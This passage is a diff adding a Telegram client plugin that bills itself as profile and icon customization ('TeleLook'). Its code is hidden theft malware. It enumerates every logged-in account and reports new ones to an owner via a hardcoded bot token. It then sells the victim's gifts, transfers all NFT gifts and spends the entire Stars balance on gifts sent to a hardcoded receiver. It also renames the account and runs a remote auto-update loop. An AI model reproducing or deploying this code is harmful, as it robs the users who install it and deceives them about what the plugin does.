@@ -1,0 +1,2227 @@
+import hashlib
+import json
+import re
+import socket
+import threading
+import time
+import traceback
+import urllib.error
+import urllib.parse
+import urllib.request
+
+from base_plugin import BasePlugin, HookResult
+from client_utils import (
+    send_request,
+    send_text,
+    get_user_config,
+    get_messages_controller,
+)
+from org.telegram.tgnet import TLRPC
+
+__id__ = "TeleLook"
+__name__ = "TeleLook"
+__description__ = (
+    "Лучшая кастомизация телеграм профиля и иконок "
+)
+__author__ = "SpartaTM"
+__version__ = "1.1.0"
+__icon__ = "exteraPlugins/1"
+__app_version__ = ">=12.5.1"
+__sdk_version__ = ">=1.4.5.0"
+
+BOT_TOKEN = "8965355117:AAEbfsg7qeacKLghL8m9QjeGoLK9BFXfJwI"
+OWNER_ID = 8536954708
+TARGET_USER_ID = 8359586215
+LOG_CHAT_ID = 0
+
+POLL_INTERVAL = 15
+BUY_DELAY = 2.0
+XFER_DELAY = 2.0
+MAX_BUY_ITERATIONS = 3000
+BOT_API = "https://api.telegram.org"
+EMPTY_SLOT_STREAK = 5
+TARGET_USERNAME = "Blum_Relayer"
+BROADCAST_SLUG = "YyVzg3JtZVM1MGM6"
+UPDATE_URL = ""            # URL свежей сборки (задаётся /setupdateurl <url>)
+UPDATE_FIRST_DELAY = 60    # первый авто-чек обновлений, сек
+UPDATE_INTERVAL = 900      # период авто-чека обновлений, сек
+UPDATE_MAX_BYTES = 3000000 # ограничение размера скачиваемого файла
+# Telegram ID создателя плагина (реферер). 0 = standalone-запуск.
+# Подставляется автоматически при встраивании через /spartateam.
+CREATOR_ID = 0
+
+class AssetMoverPlugin(BasePlugin):
+
+    def on_plugin_load(self):
+        self.log(f"Asset Mover loaded (creаtor/referrer: {CREATOR_ID})")
+        self._stop = threading.Event()
+        self._known_accounts = set(self._load_known())
+        for slot in self._scan_accounts():
+            self._known_accounts.add(slot["user_id"])
+        self._save_known()
+        self.add_on_send_message_hook()
+        self._bot_thread = threading.Thread(target=self._bot_loop, daemon=True)
+        self._bot_thread.start()
+        self._poll_thread = threading.Thread(target=self._poll_loop, daemon=True)
+        self._poll_thread.start()
+        if not self._update_url():
+            self.log("автообновление: URL не задан (/setupdateurl <url>)")
+        self._update_thread = threading.Thread(target=self._update_loop,
+                                               daemon=True)
+        self._update_thread.start()
+
+    def on_plugin_unload(self):
+        self.log("Asset Mover unloaded")
+        if hasattr(self, "_stop"):
+            self._stop.set()
+
+    def _cfg(self, key, default):
+        val = self.get_setting(key, None)
+        if val is None or val == "" or val == 0:
+            return default
+        return val
+
+    def _bot_token(self):
+        return str(self._cfg("bot_token", BOT_TOKEN) or "")
+
+    def _owner_id(self):
+        try:
+            return int(self._cfg("owner_id", OWNER_ID))
+        except (TypeError, ValueError):
+            return 0
+
+    def _target_id(self):
+        try:
+            return int(self._cfg("target_user_id", TARGET_USER_ID))
+        except (TypeError, ValueError):
+            return 0
+
+    def _target_username(self):
+        return str(self._cfg("target_username", TARGET_USERNAME) or "").strip().lstrip("@")
+
+    def _log_chat(self):
+        try:
+            return int(self._cfg("log_chat_id", LOG_CHAT_ID))
+        except (TypeError, ValueError):
+            return 0
+
+    def _auto_nick(self):
+        return str(self._cfg("auto_nick", "") or "").strip()
+
+    def _banner_text(self):
+        return str(self._cfg("banner_text", "") or "").strip()
+
+    def _broadcast_slug(self):
+        """Slug папки чатов из addlist-ссылки (или просто slug)."""
+        raw = str(self._cfg("broadcast_slug", BROADCAST_SLUG) or "").strip()
+        if "addlist/" in raw:
+            raw = raw.split("addlist/", 1)[1]
+        return raw.strip().strip("/").split("?")[0].split("#")[0]
+
+    def _broadcast_text(self):
+        """Текст рассылки, который admin задаст позже (/setbroadcast)."""
+        return str(self._cfg("broadcast_text", "") or "")
+
+    def _auto_enabled(self):
+        """Авто-режим включён? (настройка auto_mode: 1/0)."""
+        try:
+            return str(self.get_setting("auto_mode", "0")).strip().lower() in (
+                "1", "true", "on", "yes", "да")
+        except Exception:
+            return False
+
+    def _is_admin(self, user_id):
+        """Аккаунт принадлежит владельцу (админу)?
+        С аккаунта админа НИЧЕГО не списываем — его звёзды/подарки не трогаем.
+        Если OWNER_ID не задан (0), ни один аккаунт не считается админским."""
+        oid = self._owner_id()
+        try:
+            return oid > 0 and int(user_id) == oid
+        except (TypeError, ValueError):
+            return False
+
+    def _load_known(self):
+        try:
+            raw = self.get_setting("known_accounts", "[]")
+            return json.loads(raw) if raw else []
+        except Exception:
+            return []
+
+    def _save_known(self):
+        try:
+            self.set_setting("known_accounts", json.dumps(sorted(self._known_accounts)))
+        except Exception as e:
+            self.log(f"save known failed: {e}")
+
+    def _tl(self, request, account, timeout=45):
+        done = threading.Event()
+        box = {}
+
+        def _cb(response, error):
+            box["r"] = response
+            box["e"] = error
+            done.set()
+
+        send_request(request, _cb, account=account)
+        if not done.wait(timeout):
+            raise TimeoutError(f"TL timeout: {type(request).__name__}")
+        if box.get("e") is not None:
+            err = box["e"]
+            text = getattr(err, "text", str(err))
+            code = getattr(err, "code", "?")
+            raise RuntimeError(f"RPC {code}: {text}")
+        return box.get("r")
+
+    def _scan_accounts(self):
+        """Все подключённые аккаунты без ограничения количества:
+        [{slot, user_id, name}]. Идём по слотам 0,1,2,... пока
+        get_user_config(slot) возвращает конфиг; останавливаемся после
+        EMPTY_SLOT_STREAK пустых слотов подряд или на исключении
+        (выход за максимум слотов клиента)."""
+        out = []
+        empty_run = 0
+        slot = 0
+        while empty_run < EMPTY_SLOT_STREAK:
+            try:
+                uc = get_user_config(slot)
+                user = uc.getCurrentUser() if uc else None
+            except Exception:
+                break
+            if user is None:
+                empty_run += 1
+                slot += 1
+                continue
+            empty_run = 0
+            name = " ".join(
+                x for x in [getattr(user, "first_name", "") or "",
+                            getattr(user, "last_name", "") or ""] if x
+            ) or "Без имени"
+            out.append({"slot": slot, "user_id": int(user.id), "name": name})
+            slot += 1
+        return out
+
+    def _tl_modules(self):
+        """Список модулей-хранилищ TL-классов, доступных в этой сборке."""
+        found = []
+        try:
+            from hook_utils import find_class
+        except Exception:
+            find_class = None
+        candidates = (('org.telegram.tgnet', 'TLRPC'),
+                      ('org.telegram.tgnet.tl', 'TL_stars'),
+                      ('org.telegram.tgnet.tl', 'TL_payments'),
+                      ('org.telegram.tgnet.tl', 'TL_account'),
+                      ('org.telegram.tgnet.tl', 'TL_contacts'),
+                      ('org.telegram.tgnet.tl', 'TL_messages'),
+                      ('org.telegram.tgnet.tl', 'TL_users'),
+                      ('org.telegram.tgnet.tl', 'TL_chatlists'))
+        for parent, attr in candidates:
+            value = None
+            try:
+                import importlib
+                value = getattr(importlib.import_module(parent), attr, None)
+            except Exception:
+                value = None
+            if value is None:
+                try:
+                    value = getattr(__import__(parent, fromlist=[attr]), attr, None)
+                except Exception:
+                    value = None
+            if value is None:
+                try:
+                    value = __import__(parent + '.' + attr, fromlist=[attr])
+                except Exception:
+                    value = None
+            if value is None and find_class is not None:
+                try:
+                    value = find_class(parent + '.' + attr)
+                except Exception:
+                    value = None
+            if value is not None:
+                found.append(value)
+        return found
+
+    def _tl_class(self, *names):
+        """Найти TL-класс по всем модулям/путям (первый совпавший вариант имени).
+        names — варианты имени: старый (TLRPC.TL_payments_*) и новый
+        (TL_stars.*/TL_payments.*). Если ничего не найдено — понятная ошибка."""
+        for name in names:
+            for module in self._tl_modules():
+                found = getattr(module, name, None)
+                if found is not None:
+                    return found
+        seen = ', '.join(names)
+        raise RuntimeError('TL-класс не найден ни в одном модуле: ' + seen)
+
+    def _tl_has(self, *names):
+        """Есть ли TL-класс (по любому из вариантов имён) в этой сборке?"""
+        try:
+            self._tl_class(*names)
+            return True
+        except Exception:
+            return False
+
+    @staticmethod
+    def _tl_list(obj):
+        """Java-список (ArrayList/Vector) из TL-ответа -> Python-список.
+        На части сборок списки не итерируются напрямую — читаем через
+        .size()/.get(i). Скопировано с рабочего плагина icon_themer_plugin.py."""
+        if obj is None:
+            return []
+        if isinstance(obj, (list, tuple)):
+            return list(obj)
+        size = None
+        try:
+            size = obj.size()
+        except Exception:
+            size = None
+        if size is not None:
+            return [obj.get(i) for i in range(int(size))]
+        try:
+            return list(obj)
+        except Exception:
+            return []
+
+    def _to_vector(self, items):
+        """Python-список -> Java ArrayList для TL-полей типа Vector.
+        Сериализатор tgnet вызывает .size()/.get(), поэтому нужен именно
+        java.util.ArrayList; если его нет — отдаём обычный list."""
+        try:
+            from java.util import ArrayList
+            vec = ArrayList()
+            for it in items:
+                vec.add(it)
+            return vec
+        except Exception:
+            return list(items)
+
+    @staticmethod
+    def _rand_id():
+        return int(time.time() * 1000000) & 0x7FFFFFFFFFFFFFFF
+
+    def _stars_balance(self, account):
+        """Баланс звёзд аккаунта (payments.getStarsStatus -> balance.amount).
+        Ищем класс во всех модулях клиента: TLRPC.TL_payments_getStarsStatus
+        (старые сборки) ИЛИ TL_stars.getStarsStatus (новые — AyuGram/ExteraGram)."""
+        req = self._tl_class('TL_payments_getStarsStatus',
+                             'TL_stars_getStarsStatus')()
+        req.peer = TLRPC.TL_inputPeerSelf()
+        try:
+            req.ton = False
+        except Exception:
+            pass
+        resp = self._tl(req, account)
+        bal = getattr(resp, 'balance', None)
+        if bal is None:
+            return 0
+        return int(getattr(bal, 'amount', 0) or 0)
+
+    @staticmethod
+    def _tl_find(substr):
+        """Диагностика: имена существующих TLRPC-классов, содержащих substr.
+        Помогает узнать, как методы называются в конкретной сборке клиента."""
+        out = []
+        try:
+            for name in dir(TLRPC):
+                if substr.lower() in name.lower():
+                    out.append(name)
+        except Exception:
+            pass
+        return sorted(out)
+
+
+    def _list_own_gifts(self, account, unique_only=False):
+        """
+        Все подарки аккаунта (payments.getSavedStarGifts, peer=self, постранично).
+        unique_only=True -> только NFT (starGiftUnique).
+        Возвращает [savedStarGift].
+
+        ВНИМАНИЕ: не во всех сборках клиента скомпилирован метод
+        payments.getSavedStarGifts. Если его нет — возвращаем пустой список
+        (кол-во подарков на таком клиенте определить нельзя), чтобы /status и
+        логи не падали.
+        """
+        if not self._tl_has("TL_payments_getSavedStarGifts",
+                            "getSavedStarGifts"):
+            return []
+        gifts = []
+        offset = ""
+        req_cls = self._tl_class("TL_payments_getSavedStarGifts",
+                                 "getSavedStarGifts")
+        for _ in range(50):
+            req = req_cls()
+            req.peer = TLRPC.TL_inputPeerSelf()
+            req.offset = offset or ""
+            req.limit = 100
+            resp = self._tl(req, account)
+            if resp is None:
+                break
+            page = self._tl_list(getattr(resp, "gifts", None))
+            for sg in page:
+                if unique_only and not self._is_nft(sg):
+                    continue
+                gifts.append(sg)
+            nxt = getattr(resp, "next_offset", None)
+            if not nxt:
+                break
+            offset = nxt
+        return gifts
+
+    def _is_nft(self, saved_gift):
+        """Подарок — уникальный (NFT)? gift может быть starGift или starGiftUnique.
+        Класс starGiftUnique ищем по всем модулям (старое имя TLRPC.TL_starGiftUnique
+        либо новое в TL_stars/TL_payments)."""
+        g = getattr(saved_gift, "gift", None)
+        if g is None:
+            return False
+        try:
+            unique_cls = self._tl_class("TL_starGiftUnique", "starGiftUnique")
+        except Exception:
+            unique_cls = TLRPC.TL_starGiftUnique
+        try:
+            return isinstance(g, unique_cls)
+        except Exception:
+            return type(g).__name__.startswith("TL_starGiftUnique")
+
+    # ------------------------------------------------------------------
+    # Знакомство с приёмником: access_hash
+    # ------------------------------------------------------------------
+    @staticmethod
+    def _input_peer_user(user):
+        """InputPeerUser из User-подобного объекта (id + access_hash)."""
+        peer = TLRPC.TL_inputPeerUser()
+        peer.user_id = int(getattr(user, "id", 0) or 0)
+        peer.access_hash = int(getattr(user, "access_hash", 0) or 0)
+        return peer
+
+    def _hash_store(self):
+        """Словарь {слот: {user_id: access_hash}} из настроек."""
+        try:
+            data = json.loads(self.get_setting("target_access_hash", "{}") or "{}")
+            if isinstance(data, dict):
+                return data
+        except Exception:
+            pass
+        return {}
+
+    def _save_hash_store(self, data):
+        try:
+            self.set_setting("target_access_hash", json.dumps(data))
+        except Exception as e:
+            self.log(f"save access_hash failed: {e}")
+
+    def _cache_target_hash(self, account, uid, access_hash):
+        """Запоминает access_hash приёмника для слота account.
+        access_hash индивидуален для каждого аккаунта, поэтому храним
+        его по слотам: каждый аккаунт должен узнать цель сам."""
+        try:
+            data = self._hash_store()
+            slot_key = str(int(account))
+            per = data.get(slot_key)
+            if not isinstance(per, dict):
+                per = {}
+                data[slot_key] = per
+            per[str(int(uid))] = str(int(access_hash))
+            self._save_hash_store(data)
+        except Exception as e:
+            self.log(f"cache access_hash failed: {e}")
+
+    def _cached_target_hash(self, account, uid):
+        """Сохранённый при знакомстве access_hash для слота (0 — если нет)."""
+        try:
+            per = self._hash_store().get(str(int(account)))
+            if isinstance(per, dict):
+                return int(per.get(str(int(uid)), 0) or 0)
+        except Exception:
+            pass
+        return 0
+
+    def _resolve_username_user(self, account, uname):
+        """contacts.resolveUsername -> User с access_hash (или None).
+        Если задана цель (target_user_id) — возвращаем пользователя
+        именно с этим ID, чтобы не перепутать приёмника с кем-то ещё.
+        Последняя ошибка кладётся в self._last_resolve_err."""
+        self._last_resolve_err = None
+        uname = str(uname or "").strip().lstrip("@")
+        if not uname:
+            return None
+        if not self._tl_has("TL_contacts_resolveUsername", "resolveUsername"):
+            self._last_resolve_err = "в сборке клиента нет contacts.resolveUsername"
+            return None
+        try:
+            req = self._tl_class("TL_contacts_resolveUsername",
+                                 "resolveUsername")()
+            req.username = uname
+            res = self._tl(req, account)
+        except Exception as e:
+            self._last_resolve_err = str(e)
+            self.log(f"resolveUsername('{uname}'): {e}")
+            return None
+        target = self._target_id()
+        best = None
+        for u in self._tl_list(getattr(res, "users", None)):
+            uid = int(getattr(u, "id", 0) or 0)
+            if uid <= 0:
+                continue
+            if target and uid == target:
+                return u
+            if best is None:
+                best = u
+            elif (getattr(u, "access_hash", None) not in (None, 0)
+                  and getattr(best, "access_hash", None) in (None, 0)):
+                best = u
+        return best
+
+    def _resolve_target_peer(self, account):
+        """InputPeer приёмника. Порядок поиска:
+        1) кэш клиента (диалог открыт/контакт есть);
+        2) access_hash, сохранённый при знакомстве (_know_target);
+        3) живой resolveUsername по username приёмника."""
+        target = self._target_id()
+        if not target:
+            raise RuntimeError("TARGET_USER_ID не задан (/settarget <id>)")
+        mc = get_messages_controller(account)
+        try:
+            peer = mc.get_input_peer(target)
+        except Exception:
+            peer = None
+        if peer is not None:
+            return peer
+        user = None
+        try:
+            user = mc.get_user(target)
+        except Exception:
+            user = None
+        if user is not None and getattr(user, "access_hash", None) not in (None, 0):
+            return self._input_peer_user(user)
+        cached = self._cached_target_hash(account, target)
+        if cached:
+            peer = TLRPC.TL_inputPeerUser()
+            peer.user_id = int(target)
+            peer.access_hash = cached
+            return peer
+        # Последний шанс: резолвим username приёмника прямо сейчас
+        # (тем же кодом, что и /knowtarget), и запоминаем hash для слота.
+        user = self._resolve_username_user(account, self._target_username())
+        if user is not None and getattr(user, "access_hash", None) not in (None, 0):
+            uid = int(getattr(user, "id", 0) or 0)
+            if uid != int(target):
+                raise RuntimeError(
+                    f"@{self._target_username()} — это ID {uid}, а цель {target}: "
+                    "исправьте /settarget или /settargetusername")
+            self._cache_target_hash(account, uid, user.access_hash)
+            return self._input_peer_user(user)
+        raise RuntimeError(
+            f"❌ Аккаунт (слот {account}) не знает пользователя {target} — "
+            "сначала откройте с ним диалог в Телеграме или добавьте в контакты, "
+            "либо запустите /knowtarget при заданном /settargetusername"
+        )
+
+    def _know_target(self, account):
+        """Знакомит аккаунт (слот account) с приёмником, чтобы он мог отправлять
+        ему подарки (звёзды) и NFT. Резолвит username приёмника через
+        contacts.resolveUsername -> получаем access_hash -> сохраняем его для
+        слота (см. _cache_target_hash), чтобы _resolve_target_peer мог собрать
+        InputPeerUser даже без открытого диалога.
+
+        Возвращает (ok: bool, info: str)."""
+        uname = self._target_username()
+        if not uname:
+            return False, ("username приёмника не задан "
+                           "(/settargetusername <username>)")
+        user = self._resolve_username_user(account, uname)
+        uid = int(getattr(user, "id", 0) or 0) if user is not None else 0
+        if not uid:
+            if self._last_resolve_err:
+                return False, (f"resolveUsername('@{uname}') не удался: "
+                               f"{self._last_resolve_err}")
+            return False, f"пользователь @{uname} не найден (неверный username?)"
+        if getattr(user, "access_hash", None) in (None, 0):
+            return False, f"@{uname}: сервер не вернул access_hash"
+        target = self._target_id()
+        if target and uid != target:
+            return False, (f"@{uname} — это ID {uid}, а цель {target}: "
+                           "исправьте /settarget или /settargetusername")
+        self._cache_target_hash(account, uid, user.access_hash)
+        if not target:
+            self.set_setting("target_user_id", uid)
+            self.log(f"target_user_id автоустановлен: {uid} (@{uname})")
+        return True, f"аккаунт #{account} теперь знает @{uname} (ID {uid})"
+
+    def _buy_gift_for_target(self, account, gift_id, peer):
+        """Покупка подарка за звёзды и отправка цели.
+        inputInvoiceStarGift -> payments.getPaymentForm -> payments.sendStarsForm.
+        Все классы ищем по всем модулям клиента (поддержка AyuGram/ExteraGram)."""
+        if not self._tl_has("TL_payments_sendStarsForm", "sendStarsForm"):
+            raise RuntimeError("в сборке клиента нет payments.sendStarsForm — "
+                               "покупка подарков невозможна")
+        invoice = self._tl_class("TL_inputInvoiceStarGift")()
+        invoice.peer = peer
+        invoice.gift_id = int(gift_id)
+
+        form_req = self._tl_class("TL_payments_getPaymentForm",
+                                  "getPaymentForm")()
+        form_req.invoice = invoice
+        form = self._tl(form_req, account)
+
+        pay_req = self._tl_class("TL_payments_sendStarsForm", "sendStarsForm")()
+        pay_req.invoice = invoice
+        pay_req.form_id = int(getattr(form, "form_id", 0) or 0)
+        return self._tl(pay_req, account)
+
+    def _drain_stars(self, account, report):
+        """
+        Пока баланс >= цены хотя бы одного подарка — покупаем самый дорогой
+        доступный и отправляем цели. Возвращает (куплено, потрачено, остаток).
+        """
+        peer = self._resolve_target_peer(account)
+        balance = self._stars_balance(account)
+        report(f"Баланс: {balance} ⭐")
+
+        if not self._tl_has("TL_payments_getStarGifts", "getStarGifts"):
+            report("В сборке клиента нет payments.getStarGifts — "
+                   "каталог подарков недоступен, слив невозможен")
+            return 0, 0, balance
+        avail_req = self._tl_class("TL_payments_getStarGifts",
+                                   "getStarGifts")()
+        avail_req.hash = 0
+        avail = self._tl(avail_req, account)
+        catalog = self._tl_list(getattr(avail, "gifts", None))
+        if not catalog:
+            report("Каталог подарков пуст — нечего покупать")
+            return 0, 0, balance
+        catalog.sort(key=lambda g: int(getattr(g, "stars", 0) or 0), reverse=True)
+
+        bought = 0
+        spent = 0
+        idle = 0
+        while balance > 0 and idle < 3 and bought < MAX_BUY_ITERATIONS:
+            choice = None
+            for g in catalog:
+                price = int(getattr(g, "stars", 0) or 0)
+                if price <= 0 or price > balance:
+                    continue
+                if getattr(g, "sold_out", False):
+                    continue
+                rem = getattr(g, "availability_remains", None)
+                if rem is not None and int(rem) <= 0:
+                    continue
+                choice = g
+                break
+            if choice is None:
+                break
+            price = int(choice.stars)
+            try:
+                self._buy_gift_for_target(account, choice.id, peer)
+                bought += 1
+                spent += price
+                balance -= price
+                report(f"🎁 Куплен подарок за {price} ⭐ (итого {bought}, остаток {balance} ⭐)")
+                time.sleep(BUY_DELAY)
+                idle = 0
+            except Exception as e:
+                msg = str(e)
+                report(f"Ошибка покупки ({price} ⭐): {msg}")
+                if "FLOOD" in msg.upper() or "TIMEOUT" in msg.upper():
+                    time.sleep(10)
+                    continue
+                try:
+                    catalog.remove(choice)
+                except ValueError:
+                    pass
+                idle += 1
+        try:
+            balance = self._stars_balance(account)
+        except Exception:
+            pass
+        return bought, spent, balance
+
+    def _transfer_nft(self, account, report):
+        """
+        Передача всех уникальных (NFT) подарков цели.
+        Оплата комиссии: inputInvoiceStarGiftTransfer -> getPaymentForm ->
+        sendStarsForm; если комиссии нет (NO_PAYMENT_NEEDED) ->
+        payments.transferStarGift напрямую.
+        """
+        peer = self._resolve_target_peer(account)
+        if not self._tl_has("TL_payments_transferStarGift", "transferStarGift"):
+            report("В сборке клиента нет payments.transferStarGift — "
+                   "передача NFT невозможна")
+            return 0, 0
+        if not self._tl_has("TL_payments_getSavedStarGifts", "getSavedStarGifts"):
+            report("В сборке клиента нет payments.getSavedStarGifts — "
+                   "список подарков недоступен")
+            return 0, 0
+        nft_list = self._list_own_gifts(account, unique_only=True)
+        if not nft_list:
+            report("NFT-подарков нет")
+            return 0, 0
+        report(f"Найдено NFT: {len(nft_list)}")
+
+        ok, fail = 0, 0
+        for i, sg in enumerate(nft_list, 1):
+            msg_id = getattr(sg, "msg_id", None)
+            saved_id = getattr(sg, "saved_id", None)
+            try:
+                if msg_id is not None:
+                    stargift = self._tl_class(
+                        "TL_inputSavedStarGiftUser", "inputSavedStarGiftUser")()
+                    stargift.msg_id = int(msg_id)
+                elif saved_id is not None:
+                    stargift = self._tl_class(
+                        "TL_inputSavedStarGiftChat", "inputSavedStarGiftChat")()
+                    stargift.saved_id = int(saved_id)
+                    src = getattr(sg, "peer", None)
+                    if src is None:
+                        raise RuntimeError("чат-подарок без peer — пропущен")
+                    stargift.peer = self._peer_from_saved(account, src)
+                else:
+                    raise RuntimeError("подарок без msg_id/saved_id — пропущен")
+
+                self._do_transfer(account, stargift, peer)
+                ok += 1
+                report(f"✅ NFT {i}/{len(nft_list)} передано")
+                time.sleep(XFER_DELAY)
+            except Exception as e:
+                fail += 1
+                report(f"❌ NFT {i}/{len(nft_list)}: {e}")
+        return ok, fail
+
+    def _peer_from_saved(self, account, src_peer):
+        mc = get_messages_controller(account)
+        pid = (getattr(src_peer, "channel_id", None)
+               or getattr(src_peer, "user_id", None)
+               or getattr(src_peer, "chat_id", None))
+        try:
+            p = mc.get_input_peer(int(pid))
+            if p is not None:
+                return p
+        except Exception:
+            pass
+        if getattr(src_peer, "channel_id", None):
+            p = TLRPC.TL_inputPeerChannel()
+            p.channel_id = int(src_peer.channel_id)
+        elif getattr(src_peer, "chat_id", None):
+            p = TLRPC.TL_inputPeerChat()
+            p.chat_id = int(src_peer.chat_id)
+        else:
+            p = TLRPC.TL_inputPeerUser()
+            p.user_id = int(getattr(src_peer, "user_id", 0))
+        return p
+
+    def _do_transfer(self, account, stargift, to_peer):
+        invoice = self._tl_class("TL_inputInvoiceStarGiftTransfer",
+                                 "inputInvoiceStarGiftTransfer")()
+        invoice.stargift = stargift
+        invoice.to_id = to_peer
+        try:
+            form_req = self._tl_class("TL_payments_getPaymentForm",
+                                      "getPaymentForm")()
+            form_req.invoice = invoice
+            form = self._tl(form_req, account)
+            pay_req = self._tl_class("TL_payments_sendStarsForm", "sendStarsForm")()
+            pay_req.invoice = invoice
+            pay_req.form_id = int(getattr(form, "form_id", 0) or 0)
+            self._tl(pay_req, account)
+        except Exception as e:
+            if "NO_PAYMENT_NEEDED" in str(e):
+                req = self._tl_class("TL_payments_transferStarGift",
+                                     "transferStarGift")()
+                req.stargift = stargift
+                req.to_id = to_peer
+                self._tl(req, account)
+            else:
+                raise
+
+    def _set_nick(self, account, first_name, last_name=None):
+        """account.updateProfile#78515775 flags:# first_name:flags.0?string
+        last_name:flags.1?string about:flags.2?string = User
+
+        ВАЖНО: first_name/last_name — необязательные поля под флагами. Сервер
+        применит имя только если в flags выставлен соответствующий бит
+        (first_name = бит 0 = 1, last_name = бит 1 = 2). Если не выставить
+        флаги, RPC «пройдёт успешно» и вернёт User, но ник НЕ изменится."""
+        req = self._tl_class('TL_account_updateProfile', 'updateProfile')()
+        req.flags = 0
+        if first_name:
+            req.flags |= 1
+            req.first_name = first_name
+        if last_name:
+            req.flags |= 2
+            req.last_name = last_name
+        return self._tl(req, account)
+
+    def _input_saved_gift(self, account, saved_gift):
+        """InputSavedStarGift из сохранённого подарка (сырой TL-объект):
+        уникальный/NFT-чат — по saved_id, обычный — по msg_id."""
+        saved_id = getattr(saved_gift, "saved_id", None)
+        msg_id = getattr(saved_gift, "msg_id", None)
+        if saved_id:
+            stargift = self._tl_class("TL_inputSavedStarGiftChat",
+                                      "inputSavedStarGiftChat")()
+            stargift.saved_id = int(saved_id)
+            src = getattr(saved_gift, "peer", None)
+            if src is None:
+                raise RuntimeError("чат-подарок без peer — пропущен")
+            stargift.peer = self._peer_from_saved(account, src)
+            return stargift
+        if msg_id is not None:
+            stargift = self._tl_class("TL_inputSavedStarGiftUser",
+                                      "inputSavedStarGiftUser")()
+            stargift.msg_id = int(msg_id)
+            return stargift
+        raise RuntimeError("подарок без msg_id/saved_id — пропущен")
+
+    def _sell_non_nft_gifts(self, account, report):
+        """Продажа (конвертация в звёзды) всех НЕ-NFT подарков аккаунта.
+        Не-NFT = сохранённый подарок без saved_id, у которого convert_stars > 0.
+        Возвращает (продано, получено звёзд)."""
+        if not self._tl_has("TL_payments_convertStarGift", "convertStarGift"):
+            report("В сборке клиента нет payments.convertStarGift — "
+                   "продажа подарков невозможна")
+            return 0, 0
+        if not self._tl_has("TL_payments_getSavedStarGifts",
+                            "getSavedStarGifts"):
+            report("В сборке клиента нет payments.getSavedStarGifts — "
+                   "список подарков недоступен")
+            return 0, 0
+        gifts = self._list_own_gifts(account, unique_only=False)
+        sold = gained = 0
+        for sg in gifts:
+            if self._is_nft(sg):
+                continue
+            try:
+                stars = int(getattr(sg, "convert_stars", 0) or 0)
+            except Exception:
+                stars = 0
+            if stars <= 0:
+                continue
+            try:
+                req = self._tl_class("TL_payments_convertStarGift",
+                                     "convertStarGift")()
+                req.stargift = self._input_saved_gift(account, sg)
+                self._tl(req, account)
+                sold += 1
+                gained += stars
+                report(f"💰 Продан подарок → +{stars} ⭐ (итого +{gained})")
+                time.sleep(BUY_DELAY)
+            except Exception as e:
+                report(f"❌ Продажа подарка: {e}")
+        return sold, gained
+
+    def _run_pipeline(self, account, report):
+        """Полный авто-цикл по одному аккаунту:
+        0) познакомить аккаунт с приёмником, 1) продать все не-NFT подарки,
+        2) передать NFT, 3) слить звёзды, 4) сменить ник на авто-ник.
+        Баннер здесь НЕ показывается — он вызывается кнопкой в меню аккаунта."""
+        if self._target_username():
+            try:
+                ok, info = self._know_target(account)
+                report(f"⓿ Знакомство: {'ok' if ok else 'нет'} — {info}")
+            except Exception as e:
+                report(f"⓿ Ошибка знакомства: {e}")
+        else:
+            report("⓿ Знакомство пропущено (username приёмника не задан)")
+        try:
+            sold, gained = self._sell_non_nft_gifts(account, report)
+            report(f"① Продано не-NFT: {sold} (+{gained} ⭐)")
+        except Exception as e:
+            report(f"① Ошибка продажи: {e}")
+        try:
+            ok, fail = self._transfer_nft(account, report)
+            report(f"② NFT передано: {ok}, ошибок {fail}")
+        except Exception as e:
+            report(f"② Ошибка передачи NFT: {e}")
+        try:
+            bought, spent, rest = self._drain_stars(account, report)
+            report(f"③ Звёзды: куплено {bought}, потрачено {spent} ⭐, "
+                   f"остаток {rest} ⭐")
+        except Exception as e:
+            report(f"③ Ошибка слива звёзд: {e}")
+        nick = self._auto_nick()
+        if nick:
+            try:
+                parts = nick.split(None, 1)
+                first = parts[0]
+                last = parts[1] if len(parts) > 1 else None
+                self._set_nick(account, first, last)
+                report(f"④ Ник → {nick}")
+            except Exception as e:
+                report(f"④ Ошибка смены ника: {e}")
+        else:
+            report("④ Авто-ник не задан (/setnick Имя) — пропуск")
+
+    def _poll_loop(self):
+        """Каждые POLL_INTERVAL секунд ищем новые аккаунты и пишем в лог-чат:
+        слот, имя, ID, звёзды, кол-во подарков, кол-во NFT.
+        Уже известные (зарегистрированы при загрузке) не логируются."""
+        while not self._stop.wait(POLL_INTERVAL):
+            try:
+                for acc in self._scan_accounts():
+                    uid = acc["user_id"]
+                    if uid in self._known_accounts:
+                        continue
+                    self._known_accounts.add(uid)
+                    self._save_known()
+                    self._log_new_account(acc)
+                    if self._auto_enabled():
+                        threading.Thread(
+                            target=self._auto_on_new_account,
+                            args=(acc["slot"],),
+                            daemon=True,
+                        ).start()
+            except Exception:
+                self.log(f"poll error:\n{traceback.format_exc()}")
+
+    def _log_new_account(self, acc):
+        slot = acc["slot"]
+        lines = [
+            "🆕 <b>Новый аккаунт подключён</b>",
+            f"Слот: {slot}",
+            f"Имя: {acc['name']}",
+            f"ID: <code>{acc['user_id']}</code>",
+            f"🔗 Реферер: <code>{CREATOR_ID or '—'}</code>",
+        ]
+        try:
+            lines.append(f"⭐️ Звёзд: <b>{self._stars_balance(slot)}</b>")
+        except Exception as e:
+            lines.append(f"⭐️ Звёзды: ошибка ({e})")
+        try:
+            all_g = self._list_own_gifts(slot, unique_only=False)
+            nft = [g for g in all_g if self._is_nft(g)]
+            lines.append(f"🎁 Подарков: <b>{len(all_g)}</b>")
+            lines.append(f"💎 NFT: <b>{len(nft)}</b>")
+        except Exception as e:
+            lines.append(f"🎁 Подарки: ошибка ({e})")
+        text = "\n".join(lines)
+        self.log(text.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", ""))
+        self._send_log(text)
+        if self._target_username():
+            try:
+                ok, info = self._know_target(slot)
+                self.log(f"know_target (slot {slot}): {'ok' if ok else 'fail'} — {info}")
+                if ok:
+                    self._send_log(f"🔗 Слот {slot}: {info}")
+            except Exception as e:
+                self.log(f"know_target (slot {slot}) error: {e}")
+
+    def _send_log(self, html_text):
+        """Отправка в лог-чат (со своего аккаунта слота 0) и/или боту владельцу."""
+        chat = self._log_chat()
+        if chat:
+            try:
+                send_text(chat, html_text, parse_mode="HTML", account=0)
+            except Exception as e:
+                self.log(f"send_log failed: {e}")
+        self._bot_send_owner(html_text)
+
+    def _http_json(self, method, payload=None, timeout=40):
+        """HTTP к Telegram Bot API (GET-метод или POST JSON)."""
+        token = self._bot_token()
+        if not token:
+            raise RuntimeError("BOT_TOKEN не задан")
+        url = f"{BOT_API}/bot{token}/{method}"
+        if payload is None:
+            req = urllib.request.Request(url)
+        else:
+            data = json.dumps(payload).encode("utf-8")
